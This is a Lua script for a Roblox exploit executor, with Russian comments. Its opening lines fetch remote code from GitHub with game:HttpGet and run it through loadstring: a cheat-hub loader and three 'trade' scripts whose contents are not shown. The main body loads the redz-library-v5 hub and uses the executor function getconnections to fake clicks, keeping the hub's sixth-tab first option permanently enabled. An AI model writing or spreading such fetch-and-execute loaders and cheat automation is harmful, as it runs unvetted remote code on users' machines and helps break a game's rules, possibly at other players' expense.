loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
oSrexVwMMNafKHmMWGDUzzaSrQmUGLLw
loadstring(game:HttpGet("https://raw.githubusercontent.com/kartytein/mrs/refs/heads/main/trade3.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kartytein/mrs/refs/heads/main/trade2.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kartytein/mrs/refs/heads/main/trade.lua"))()

-- ============================================================
-- Автоактиватор кнопки 6,1 (хаб redz-library-v5)
-- Загружает хаб, ждёт интерфейс, следит за состоянием кнопки.
-- Если кнопка выключена – включает. Если не найдена – ждёт.
-- ============================================================

-- 1. Загружаем хаб в фоне
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
    end)
end)

local CoreGui = game:GetService("CoreGui")

-- Настройки: вкладка 6, опция 1
local TAB = 6
local OPT = 1
local COLOR_ON  = "0.345098, 0.396078, 0.94902"
local COLOR_OFF = "0.239216, 0.262745, 0.529412"

-- Логирование
local function log(msg)
    pcall(function() warn("[Button 6,1] " .. msg) end)
end

-- Поиск корня интерфейса
local function getRoot()
    for _, child in ipairs(CoreGui:GetChildren()) do
        local obj = child:FindFirstChild("redz-library-v5")
        if obj then return obj end
    end
    return nil
end

-- Безопасный поиск цепочки
local function safeFind(obj, ...)
    for _, name in ipairs({...}) do
        if not obj then return nil end
        obj = obj:FindFirstChild(name)
    end
    return obj
end

-- Ожидание полной загрузки интерфейса (TabsScroll существует)
local function waitForInterface()
    if not getRoot() then return false end
    return safeFind(getRoot(), "Window", "Components", "TabsScroll") ~= nil
end

log("Ожидание интерфейса хаба...")
repeat task.wait(0.5) until waitForInterface()
log("Интерфейс готов.")

-- Эмуляция клика по кнопке
local function fireSequence(btn)
    if not (btn:IsA("TextButton") or btn:IsA("ImageButton")) then return end
    local signals = {"MouseEnter","MouseButton1Down","MouseButton1Click","MouseButton1Up","Activated","MouseLeave"}
    for _, sig in ipairs(signals) do
        local event = btn[sig]
        if event then
            for _, conn in ipairs(getconnections(event) or {}) do
                if conn.Enabled then pcall(conn.Function) end
            end
        end
    end
end

-- Поиск индикатора (цветного Frame)
local function findIndicatorFrame(parent)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("Frame") then
            local col = tostring(child.BackgroundColor3)
            if col == COLOR_ON or col == COLOR_OFF then return child end
        end
        local found = findIndicatorFrame(child)
        if found then return found end
    end
    return nil
end

-- Получить состояние кнопки ("on", "off" или nil если не найдена)
local function getOptionState(tabIndex, optIndex)
    local root = getRoot()
    if not root then return nil end
    local tabsScroll = safeFind(root, "Window", "Components", "TabsScroll")
    if not tabsScroll then return nil end
    -- Ищем вкладку
    local tabButton, tabCount = nil, 0
    local function findTab(p)
        if tabButton then return end
        for _, c in ipairs(p:GetChildren()) do
            if c:IsA("TextButton") or c:IsA("ImageButton") then
                tabCount += 1
                if tabCount == tabIndex then tabButton = c return end
            end
            findTab(c)
        end
    end
    findTab(tabsScroll)
    if not tabButton then return nil end
    fireSequence(tabButton)
    task.wait(0.3)  -- ожидание прогрузки контейнера
    -- Ищем опцию
    local container = safeFind(root, "Window", "Components", "Containers", "Container")
    if not container then return nil end
    local optionBtn, optCount = nil, 0
    for _, c in ipairs(container:GetChildren()) do
        if c.Name == "Option" and c.Visible and (c:IsA("TextButton") or c:IsA("ImageButton")) then
            optCount += 1
            if optCount == optIndex then optionBtn = c break end
        end
    end
    if not optionBtn then return nil end
    local indicator = findIndicatorFrame(optionBtn)
    if not indicator then return nil end
    local col = tostring(indicator.BackgroundColor3)
    if col == COLOR_ON then return "on"
    elseif col == COLOR_OFF then return "off"
    else return nil
    end
end

-- Включить опцию, если она выключена
local function enableOption()
    local state = getOptionState(TAB, OPT)
    if state == "on" then return true end
    if state ~= "off" then return false end

    -- Теперь надо переключить: сначала открыть вкладку, потом кликнуть опцию
    local root = getRoot()
    if not root then return false end
    local tabsScroll = safeFind(root, "Window", "Components", "TabsScroll")
    if not tabsScroll then return false end
    local tabButton, tabCount = nil, 0
    local function findTab(p)
        if tabButton then return end
        for _, c in ipairs(p:GetChildren()) do
            if c:IsA("TextButton") or c:IsA("ImageButton") then
                tabCount += 1
                if tabCount == TAB then tabButton = c return end
            end
            findTab(c)
        end
    end
    findTab(tabsScroll)
    if not tabButton then return false end
    fireSequence(tabButton)
    task.wait(0.3)
    local container = safeFind(root, "Window", "Components", "Containers", "Container")
    if not container then return false end
    local optionBtn, optCount = nil, 0
    for _, c in ipairs(container:GetChildren()) do
        if c.Name == "Option" and c.Visible and (c:IsA("TextButton") or c:IsA("ImageButton")) then
            optCount += 1
            if optCount == OPT then optionBtn = c break end
        end
    end
    if not optionBtn then return false end
    fireSequence(optionBtn)
    task.wait(0.1)
    return true
end

-- Основной цикл: держать кнопку включённой
log("Скрипт запущен, следим за кнопкой 6,1")
while true do
    local state = getOptionState(TAB, OPT)
    if state == "off" then
        log("Кнопка выключена, включаю...")
        local ok = enableOption()
        if not ok then
            log("Не удалось включить кнопку, повтор через 3 сек")
        end
    elseif state == "on" then
        -- всё хорошо, ничего не делаем
    else
        log("Кнопка не найдена, ожидание...")
    end
    task.wait(3)  -- проверка раз в 3 секунды
end
